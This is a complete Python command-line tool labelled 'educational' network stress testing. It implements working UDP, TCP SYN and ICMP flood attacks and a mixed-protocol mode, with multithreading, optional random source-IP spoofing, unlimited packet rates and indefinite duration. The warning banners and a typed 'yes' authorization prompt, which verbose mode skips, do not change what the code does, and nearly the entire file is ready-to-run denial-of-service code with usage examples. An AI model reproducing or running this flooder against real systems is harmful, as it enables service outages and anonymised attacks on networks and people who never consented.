#!/usr/bin/env python3
"""
Advanced Network Stress Testing Tool
====================================

EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED NETWORK TESTING ONLY

This tool demonstrates various network stress testing techniques to understand
WiFi performance degradation under heavy load. It implements multiple attack
vectors commonly used in network research and penetration testing.

WARNING: Only use this tool on networks you own or have explicit permission to test.
Unauthorized use may violate laws and network policies.

Author: Educational Research Tool
License: Educational Use Only
"""

import socket
import threading
import time
import random
import struct
import argparse
import sys
import os
import signal
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Any
import ipaddress

# Check for required modules and provide installation instructions
try:
    import psutil
except ImportError:
    print("Error: psutil module required. Install with: pip install psutil")
    sys.exit(1)

try:
    from scapy.all import IP, TCP, UDP, ICMP, send, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    print("Warning: scapy not available. Some advanced features will be limited.")
    print("Install with: pip install scapy")
    SCAPY_AVAILABLE = False

@dataclass
class StressTestConfig:
    """Configuration class for stress test parameters"""
    target_ip: str
    target_port: int
    thread_count: int
    packet_size: int
    packets_per_second: int
    duration: int
    test_types: List[str]
    source_ip_spoofing: bool = False
    verbose: bool = False

class NetworkStressTester:
    """
    Advanced Network Stress Testing Tool
    
    This class implements various network stress testing techniques:
    1. UDP Flood - Saturates bandwidth with UDP packets
    2. TCP SYN Flood - Exhausts connection resources
    3. ICMP Flood - Generates latency spikes
    4. Multi-protocol simultaneous attacks
    """
    
    def __init__(self, config: StressTestConfig):
        self.config = config
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': 0,
            'threads_active': 0
        }
        self.threads = []
        
        # Validate target IP
        try:
            ipaddress.ip_address(config.target_ip)
        except ValueError:
            raise ValueError(f"Invalid target IP address: {config.target_ip}")
    
    def print_banner(self):
        """Display tool banner and warnings"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                NETWORK STRESS TESTING TOOL                   ║
║                   EDUCATIONAL USE ONLY                       ║
╠══════════════════════════════════════════════════════════════╣
║  WARNING: Only use on networks you own or have permission    ║
║  to test. Unauthorized use may be illegal and unethical.     ║
║                                                              ║
║  This tool demonstrates network congestion effects for       ║
║  research and educational purposes.                          ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"Target: {self.config.target_ip}:{self.config.target_port}")
        print(f"Test Types: {', '.join(self.config.test_types)}")
        print(f"Threads: {self.config.thread_count}")
        print(f"Duration: {self.config.duration} seconds")
        print("=" * 64)
    
    def udp_flood_worker(self, thread_id: int):
        """
        UDP Flood Worker Thread
        
        This function implements UDP flooding, which saturates network bandwidth
        by sending large volumes of UDP packets. UDP is connectionless, making
        it ideal for bandwidth saturation attacks.
        
        Mechanism:
        - Creates raw UDP socket
        - Generates packets with random or fixed payload
        - Sends packets at high rate to target
        - No connection state tracking (stateless)
        """
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Generate payload data
            payload = b'A' * self.config.packet_size
            target = (self.config.target_ip, self.config.target_port)
            
            packets_sent = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Send UDP packet
                    sock.sendto(payload, target)
                    packets_sent += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(payload)
                    
                    # Rate limiting - control packets per second
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:  # Check rate every second
                        if packets_sent > self.config.packets_per_second:
                            # Sleep to maintain target rate
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        packets_sent = 0
                        last_rate_check = current_time
                    
                    # Micro-delay to prevent CPU saturation
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except socket.error as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"UDP Thread {thread_id} error: {e}")
                    time.sleep(0.01)  # Brief pause on error
            
            sock.close()
            
        except Exception as e:
            print(f"UDP Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def tcp_syn_flood_worker(self, thread_id: int):
        """
        TCP SYN Flood Worker Thread
        
        This implements TCP SYN flooding, which exhausts server connection
        resources by sending many SYN packets without completing handshakes.
        
        Mechanism:
        - Sends TCP SYN packets with random source ports
        - Server allocates resources for each SYN (half-open connections)
        - Never completes 3-way handshake (no ACK sent back)
        - Eventually exhausts server's connection table
        
        Note: This requires raw sockets (root privileges) for full effectiveness
        """
        if not SCAPY_AVAILABLE:
            print(f"TCP SYN Thread {thread_id}: Scapy required for SYN flood")
            return
        
        try:
            packets_sent = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Generate random source port for each SYN
                    src_port = random.randint(1024, 65535)
                    
                    # Create TCP SYN packet
                    # IP layer: source can be spoofed if enabled
                    if self.config.source_ip_spoofing:
                        src_ip = f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    else:
                        src_ip = None  # Use local IP
                    
                    # TCP layer: SYN flag set, random sequence number
                    packet = IP(dst=self.config.target_ip, src=src_ip) / \
                            TCP(sport=src_port, 
                                dport=self.config.target_port, 
                                flags="S",  # SYN flag
                                seq=random.randint(1000, 9000))
                    
                    # Send packet (scapy handles raw socket creation)
                    send(packet, verbose=0)
                    
                    packets_sent += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                    
                    # Rate limiting
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:
                        if packets_sent > self.config.packets_per_second:
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        packets_sent = 0
                        last_rate_check = current_time
                    
                    # Rate control delay
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"TCP SYN Thread {thread_id} error: {e}")
                    time.sleep(0.01)
            
        except Exception as e:
            print(f"TCP SYN Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def icmp_flood_worker(self, thread_id: int):
        """
        ICMP Flood Worker Thread
        
        This implements ICMP flooding (ping flood) which can cause latency
        spikes and consume network resources processing ICMP packets.
        
        Mechanism:
        - Sends high-volume ICMP Echo Request packets
        - Target must process and respond to each packet
        - Can saturate processing capacity
        - Generates network congestion and latency
        """
        if not SCAPY_AVAILABLE:
            # Fallback to system ping if scapy unavailable
            self.system_ping_worker(thread_id)
            return
        
        try:
            packets_sent = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Create ICMP packet with random ID and sequence
                    packet = IP(dst=self.config.target_ip) / \
                            ICMP(id=random.randint(1, 65535), 
                                 seq=random.randint(1, 65535)) / \
                            Raw(load=b'A' * (self.config.packet_size - 28))  # 28 = IP + ICMP headers
                    
                    send(packet, verbose=0)
                    
                    packets_sent += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                    
                    # Rate limiting
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:
                        if packets_sent > self.config.packets_per_second:
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        packets_sent = 0
                        last_rate_check = current_time
                    
                    # Rate control
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"ICMP Thread {thread_id} error: {e}")
                    time.sleep(0.01)
            
        except Exception as e:
            print(f"ICMP Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def system_ping_worker(self, thread_id: int):
        """
        Fallback ping implementation using system ping command
        Used when scapy is not available
        """
        try:
            while self.running:
                try:
                    # Use system ping with minimal interval
                    os.system(f"ping -c 1 -W 1 {self.config.target_ip} > /dev/null 2>&1")
                    self.stats['packets_sent'] += 1
                    
                    # Control rate
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    time.sleep(0.1)
        
        except Exception as e:
            print(f"System Ping Thread {thread_id} crashed: {e}")
    
    def mixed_protocol_worker(self, thread_id: int):
        """
        Mixed Protocol Worker - Combines multiple attack vectors
        
        This worker randomly selects between UDP, TCP SYN, and ICMP
        to create realistic mixed-traffic stress patterns.
        """
        protocols = ['udp', 'tcp_syn', 'icmp']
        
        while self.running:
            try:
                # Randomly select protocol for this packet
                protocol = random.choice(protocols)
                
                if protocol == 'udp':
                    self.send_udp_packet()
                elif protocol == 'tcp_syn' and SCAPY_AVAILABLE:
                    self.send_tcp_syn_packet()
                elif protocol == 'icmp' and SCAPY_AVAILABLE:
                    self.send_icmp_packet()
                
                # Rate limiting
                if self.config.packets_per_second > 0:
                    time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
            
            except Exception as e:
                self.stats['errors'] += 1
                if self.config.verbose:
                    print(f"Mixed Protocol Thread {thread_id} error: {e}")
                time.sleep(0.01)
    
    def send_udp_packet(self):
        """Helper method to send single UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'A' * self.config.packet_size
            sock.sendto(payload, (self.config.target_ip, self.config.target_port))
            sock.close()
            
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(payload)
        except:
            self.stats['errors'] += 1
    
    def send_tcp_syn_packet(self):
        """Helper method to send single TCP SYN packet"""
        if not SCAPY_AVAILABLE:
            return
        
        try:
            src_port = random.randint(1024, 65535)
            packet = IP(dst=self.config.target_ip) / \
                    TCP(sport=src_port, dport=self.config.target_port, flags="S")
            send(packet, verbose=0)
            
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(packet)
        except:
            self.stats['errors'] += 1
    
    def send_icmp_packet(self):
        """Helper method to send single ICMP packet"""
        if not SCAPY_AVAILABLE:
            return
        
        try:
            packet = IP(dst=self.config.target_ip) / ICMP()
            send(packet, verbose=0)
            
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(packet)
        except:
            self.stats['errors'] += 1
    
    def monitor_stats(self):
        """
        Statistics monitoring thread
        Displays real-time performance metrics
        """
        print("\nStarting network stress test...")
        print("Press Ctrl+C to stop\n")
        
        while self.running:
            try:
                elapsed = time.time() - self.stats['start_time']
                pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                mbps = (self.stats['bytes_sent'] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
                
                # Get system network statistics
                net_io = psutil.net_io_counters()
                
                print(f"\r[{elapsed:.1f}s] Packets: {self.stats['packets_sent']:,} | "
                      f"Rate: {pps:.1f} pps | Bandwidth: {mbps:.2f} Mbps | "
                      f"Errors: {self.stats['errors']} | "
                      f"Threads: {threading.active_count()-2}", end="", flush=True)
                
                time.sleep(1)
            
            except Exception as e:
                if self.config.verbose:
                    print(f"\nMonitoring error: {e}")
                time.sleep(1)
    
    def start_test(self):
        """
        Main test execution method
        Starts all worker threads based on configured test types
        """
        self.print_banner()
        
        # Confirm execution
        if not self.config.verbose:
            confirm = input("\nAre you authorized to test this network? (yes/no): ")
            if confirm.lower() != 'yes':
                print("Test cancelled.")
                return
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Start worker threads based on test types
        thread_id = 0
        
        for test_type in self.config.test_types:
            for i in range(self.config.thread_count):
                if test_type == 'udp':
                    thread = threading.Thread(target=self.udp_flood_worker, args=(thread_id,))
                elif test_type == 'tcp_syn':
                    thread = threading.Thread(target=self.tcp_syn_flood_worker, args=(thread_id,))
                elif test_type == 'icmp':
                    thread = threading.Thread(target=self.icmp_flood_worker, args=(thread_id,))
                elif test_type == 'mixed':
                    thread = threading.Thread(target=self.mixed_protocol_worker, args=(thread_id,))
                else:
                    continue
                
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                thread_id += 1
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_stats)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Run for specified duration
            if self.config.duration > 0:
                time.sleep(self.config.duration)
            else:
                # Run indefinitely until Ctrl+C
                while True:
                    time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n\nStopping test...")
        
        finally:
            self.stop_test()
    
    def stop_test(self):
        """Stop all test threads and display final statistics"""
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        # Display final statistics
        elapsed = time.time() - self.stats['start_time']
        total_packets = self.stats['packets_sent']
        total_bytes = self.stats['bytes_sent']
        avg_pps = total_packets / elapsed if elapsed > 0 else 0
        avg_mbps = (total_bytes * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        print(f"\n\n{'='*60}")
        print("FINAL STATISTICS")
        print(f"{'='*60}")
        print(f"Duration:        {elapsed:.2f} seconds")
        print(f"Total Packets:   {total_packets:,}")
        print(f"Total Bytes:     {total_bytes:,} ({total_bytes/(1024*1024):.2f} MB)")
        print(f"Average PPS:     {avg_pps:.1f}")
        print(f"Average Mbps:    {avg_mbps:.2f}")
        print(f"Errors:          {self.stats['errors']}")
        print(f"Success Rate:    {((total_packets-self.stats['errors'])/total_packets*100):.1f}%" if total_packets > 0 else "N/A")
        print(f"{'='*60}")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\nReceived interrupt signal. Stopping...")
    sys.exit(0)

def validate_config(config: StressTestConfig) -> bool:
    """Validate configuration parameters"""
    if config.thread_count <= 0 or config.thread_count > 1000:
        print("Error: Thread count must be between 1 and 1000")
        return False
    
    if config.packet_size < 1 or config.packet_size > 65507:
        print("Error: Packet size must be between 1 and 65507 bytes")
        return False
    
    if config.packets_per_second < 0:
        print("Error: Packets per second must be non-negative")
        return False
    
    if not config.test_types:
        print("Error: At least one test type must be specified")
        return False
    
    valid_types = ['udp', 'tcp_syn', 'icmp', 'mixed']
    for test_type in config.test_types:
        if test_type not in valid_types:
            print(f"Error: Invalid test type '{test_type}'. Valid types: {valid_types}")
            return False
    
    return True

def main():
    """Main function with command-line argument parsing"""
    parser = argparse.ArgumentParser(
        description="Advanced Network Stress Testing Tool - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # UDP flood test
  python3 network_stress_tester.py -t 192.168.1.1 -p 80 --test-types udp --threads 10 --pps 1000

  # Mixed protocol test
  python3 network_stress_tester.py -t 192.168.1.1 -p 80 --test-types mixed --threads 5 --duration 30

  # TCP SYN flood (requires root/scapy)
  sudo python3 network_stress_tester.py -t 192.168.1.1 -p 80 --test-types tcp_syn --threads 20

WARNING: Only use on networks you own or have explicit permission to test!
        """
    )
    
    parser.add_argument('-t', '--target', required=True, 
                       help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80,
                       help='Target port (default: 80)')
    parser.add_argument('--test-types', nargs='+', 
                       choices=['udp', 'tcp_syn', 'icmp', 'mixed'],
                       default=['udp'],
                       help='Types of tests to run (default: udp)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads per test type (default: 10)')
    parser.add_argument('--packet-size', type=int, default=1024,
                       help='Packet size in bytes (default: 1024)')
    parser.add_argument('--pps', type=int, default=0,
                       help='Packets per second per thread (0 = unlimited, default: 0)')
    parser.add_argument('--duration', type=int, default=0,
                       help='Test duration in seconds (0 = until Ctrl+C, default: 0)')
    parser.add_argument('--spoof-ip', action='store_true',
                       help='Enable source IP spoofing (requires raw sockets)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Create configuration
    config = StressTestConfig(
        target_ip=args.target,
        target_port=args.port,
        thread_count=args.threads,
        packet_size=args.packet_size,
        packets_per_second=args.pps,
        duration=args.duration,
        test_types=args.test_types,
        source_ip_spoofing=args.spoof_ip,
        verbose=args.verbose
    )
    
    # Validate configuration
    if not validate_config(config):
        sys.exit(1)
    
    # Check for root privileges if needed
    if 'tcp_syn' in config.test_types or 'icmp' in config.test_types or config.source_ip_spoofing:
        if os.geteuid() != 0 and not SCAPY_AVAILABLE:
            print("Warning: Root privileges may be required for TCP SYN flood and ICMP flood.")
            print("Consider installing scapy or running with sudo.")
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and start tester
    tester = NetworkStressTester(config)
    tester.start_test()

if __name__ == "__main__":
    main()